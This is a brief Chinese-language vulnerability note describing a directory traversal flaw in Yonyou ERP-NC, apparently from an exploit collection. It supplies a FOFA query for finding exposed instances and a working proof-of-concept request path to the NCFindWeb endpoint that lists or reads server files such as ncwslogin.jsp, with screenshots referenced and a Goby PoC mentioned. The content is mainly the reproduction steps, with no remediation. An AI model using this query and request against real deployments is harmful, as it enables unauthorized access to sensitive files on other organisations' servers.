# 用友ERP-NC-目录遍历漏洞

## 漏洞描述

用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息

## 漏洞影响

> [!NOTE]
>
> 用友ERP-NC 

##  FOFA

> [!NOTE]
>
> app="用友-UFIDA-NC"

## 漏洞复现

POC为

```
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![](用友ERP-NC-目录遍历漏洞.assets/1627363548489986.jpg)

查看 ncwslogin.jsp 文件

![](用友ERP-NC-目录遍历漏洞.assets/1627363548743364.jpg)

## Goby & POC

> [!NOTE]
>
> YongYou ERP-NC directory traversal

![](用友ERP-NC-目录遍历漏洞.assets/16273635490828218.jpg)